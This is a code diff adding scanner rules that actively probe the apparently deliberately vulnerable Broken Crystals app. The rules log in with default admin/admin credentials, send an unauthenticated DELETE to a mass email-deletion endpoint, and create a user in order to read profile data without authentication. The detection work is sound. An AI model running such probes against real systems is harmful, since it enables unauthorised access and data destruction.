@@ -60289,6 +60289,160 @@ const brokencrystalsEmailSmtpProxyRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
+const brokencrystalsAdminLoginBflaLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const loginUrl = new URL("/api/auth/admin/login", ctx.origin).toString();
+  const loginDoc = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body: JSON.stringify({ user: "admin", password: "admin", op: "basic" }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 2048,
+    timeoutMs: 15000
+  });
+  if (loginDoc.status < 200 || loginDoc.status >= 300) return NEGATIVE;
+  let parsed: Record<string, unknown>;
+  try {
+    const body = JSON.parse(loginDoc.body) as unknown;
+    if (!body || typeof body !== "object") return NEGATIVE;
+    parsed = body as Record<string, unknown>;
+  } catch {
+    return NEGATIVE;
+  }
+  const ldapProfileLink = String(parsed.ldapProfileLink ?? "");
+  const email = String(parsed.email ?? "");
+  if (!email || !ldapProfileLink.includes("objectClass=person")) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      url: loginUrl,
+      email,
+      ldapProfileLink: ldapProfileLink.slice(0, 120),
+      snippet: loginDoc.body.slice(0, 200).trim(),
+      note: "Broken Crystals POST /api/auth/admin/login accepts default admin/admin credentials and returns ldapProfileLink without JWT — BFLA admin login oracle"
+    }
+  };
+};
+
+const brokencrystalsAdminLoginBflaRouteLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/auth\/admin\/login\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await brokencrystalsAdminLoginBflaLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Broken Crystals /api/auth/admin/login route scan — default admin credentials return ldapProfileLink without authentication gate"
+    }
+  };
+};
+
+const brokencrystalsDeleteEmailsLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const deleteUrl = new URL("/api/email/deleteEmails", ctx.origin).toString();
+  const doc = await ctx.probe.get(deleteUrl, {
+    method: "DELETE",
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200) return NEGATIVE;
+  const smtpProxyOk =
+    /ECONNREFUSED\s+127\.0\.0\.1:1080/i.test(doc.body) ||
+    (/127\.0\.0\.1:1080/i.test(doc.body) && /ECONNREFUSED|connect/i.test(doc.body));
+  if (!smtpProxyOk) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: deleteUrl,
+      status: doc.status,
+      snippet: doc.body.slice(0, 200).trim(),
+      note: "Broken Crystals DELETE /api/email/deleteEmails is reachable without auth and attempts server-side SMTP connection to 127.0.0.1:1080 — mass email deletion oracle"
+    }
+  };
+};
+
+const brokencrystalsDeleteEmailsRouteLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/email\/deleteEmails\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await brokencrystalsDeleteEmailsLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Broken Crystals /api/email/deleteEmails route scan — unauthenticated DELETE triggers internal SMTP proxy connection"
+    }
+  };
+};
+
+const brokencrystalsV1UserinfoDisclosureLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const email = `thugir-v1ui-${Date.now()}-${Math.random().toString(36).slice(2, 8)}@thugir-probe.invalid`;
+  const password = "ThugirProbe123!";
+  const createUrl = new URL("/api/users/basic", ctx.origin).toString();
+  const createDoc = await ctx.probe.get(createUrl, {
+    method: "POST",
+    body: JSON.stringify({
+      email,
+      firstName: "Thugir",
+      lastName: "Probe",
+      company: "ProbeCo",
+      cardNumber: "0000",
+      phoneNumber: "000-0000",
+      password,
+      op: "basic"
+    }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 512,
+    timeoutMs: 15000
+  });
+  if (createDoc.status < 200 || createDoc.status >= 300) return NEGATIVE;
+  const userinfoUrl = new URL(`/api/v1/userinfo/${encodeURIComponent(email)}`, ctx.origin).toString();
+  const userinfoDoc = await ctx.probe.get(userinfoUrl, { maxBytes: 4096, timeoutMs: 15000 });
+  const user = brokencrystalsParseUserProfile(userinfoDoc);
+  if (!user) return NEGATIVE;
+  const returnedEmail = String(user.email ?? "");
+  const firstName = String(user.firstName ?? "");
+  if (returnedEmail !== email || !firstName) return NEGATIVE;
+  if (typeof user.id !== "number" && typeof user.id !== "string") return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      createUrl,
+      userinfoUrl,
+      email: returnedEmail,
+      snippet: userinfoDoc.body.slice(0, 200).trim(),
+      note: "Broken Crystals GET /api/v1/userinfo/{email} returns firstName, lastName, company, and id without authentication — v1 userinfo disclosure oracle"
+    }
+  };
+};
+
+const brokencrystalsV1UserinfoDisclosureRouteLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/v1\/userinfo\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await brokencrystalsV1UserinfoDisclosureLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Broken Crystals /api/v1/userinfo route scan — GET returns user profile fields without authentication"
+    }
+  };
+};
+
 const brokencrystalsTestimonialsSqliLiveOracle: Rule = async (ctx) => {
   if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
   const url = new URL("/api/testimonials/count", ctx.origin);
@@ -66454,6 +66608,12 @@ export const RULES: Record<string, Rule> = {
   brokencrystalsUsersIdBolaRouteLiveOracle,
   brokencrystalsEmailSmtpProxyLiveOracle,
   brokencrystalsEmailSmtpProxyRouteLiveOracle,
+  brokencrystalsAdminLoginBflaLiveOracle,
+  brokencrystalsAdminLoginBflaRouteLiveOracle,
+  brokencrystalsDeleteEmailsLiveOracle,
+  brokencrystalsDeleteEmailsRouteLiveOracle,
+  brokencrystalsV1UserinfoDisclosureLiveOracle,
+  brokencrystalsV1UserinfoDisclosureRouteLiveOracle,
   brokencrystalsTestimonialsSqliLiveOracle,
   brokencrystalsTestimonialsIframeInjectionLiveOracle,
   brokencrystalsTestimonialsXssLiveOracle,
